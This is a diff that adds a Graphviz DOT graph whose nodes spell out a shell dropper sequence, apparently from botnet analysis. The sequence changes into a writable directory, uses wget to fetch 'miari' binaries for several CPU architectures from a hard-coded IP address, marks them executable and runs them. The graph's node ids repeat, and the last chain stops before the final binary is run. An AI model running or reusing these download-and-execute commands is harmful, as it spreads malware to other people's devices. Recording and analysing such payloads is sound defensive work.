@@ -1,0 +1,80 @@
+digraph {
+64 [label="cd /tmp "];
+64 -> 64
+66 [label="cd /var/run "];
+66 -> 68 [label="||,"];
+68 [label="cd /mnt "];
+68 -> 70 [label="||,"];
+70 [label="cd /root "];
+70 -> 72 [label="||,"];
+72 [label="cd / "];
+72 -> 10 [label="||,"];
+10 [label="wget http://198.167.140.126/miari.mips "];
+10 -> 12 [label=";,"];
+12 [label="chmod +x miari.mips "];
+12 -> 14 [label=";,"];
+14 [label="./miari.mips\r "];
+14 -> 64 [label=";,"];
+64 [label="cd /tmp "];
+64 -> 64
+66 [label="cd /var/run "];
+66 -> 68 [label="||,"];
+68 [label="cd /mnt "];
+68 -> 70 [label="||,"];
+70 [label="cd /root "];
+70 -> 72 [label="||,"];
+72 [label="cd / "];
+72 -> 26 [label="||,"];
+26 [label="wget http://198.167.140.126/miari.sh4 "];
+26 -> 28 [label=";,"];
+28 [label="chmod +x miari.sh4 "];
+28 -> 30 [label=";,"];
+30 [label="./miari.sh4\r "];
+30 -> 64 [label=";,"];
+64 [label="cd /tmp "];
+64 -> 64
+66 [label="cd /var/run "];
+66 -> 68 [label="||,"];
+68 [label="cd /mnt "];
+68 -> 70 [label="||,"];
+70 [label="cd /root "];
+70 -> 72 [label="||,"];
+72 [label="cd / "];
+72 -> 42 [label="||,"];
+42 [label="wget http://198.167.140.126/miari.arm7 "];
+42 -> 44 [label=";,"];
+44 [label="chmod +x miari.arm7 "];
+44 -> 46 [label=";,"];
+46 [label="./miari.arm7\r "];
+46 -> 64 [label=";,"];
+64 [label="cd /tmp "];
+64 -> 64
+66 [label="cd /var/run "];
+66 -> 68 [label="||,"];
+68 [label="cd /mnt "];
+68 -> 70 [label="||,"];
+70 [label="cd /root "];
+70 -> 72 [label="||,"];
+72 [label="cd / "];
+72 -> 58 [label="||,"];
+58 [label="wget http://198.167.140.126/miari.arm "];
+58 -> 60 [label=";,"];
+60 [label="chmod +x miari.arm "];
+60 -> 62 [label=";,"];
+62 [label="./miari.arm\r "];
+62 -> 64 [label=";,"];
+64 [label="cd /tmp "];
+64 -> 64
+66 [label="cd /var/run "];
+66 -> 68 [label="||,"];
+68 [label="cd /mnt "];
+68 -> 70 [label="||,"];
+70 [label="cd /root "];
+70 -> 72 [label="||,"];
+72 [label="cd / "];
+72 -> 74 [label="||,"];
+74 [label="wget http://198.167.140.126/miari.dbg "];
+74 -> 76 [label=";,"];
+76 [label="chmod +x miari.dbg "];
+76 -> 77 [label=";,"];
+}
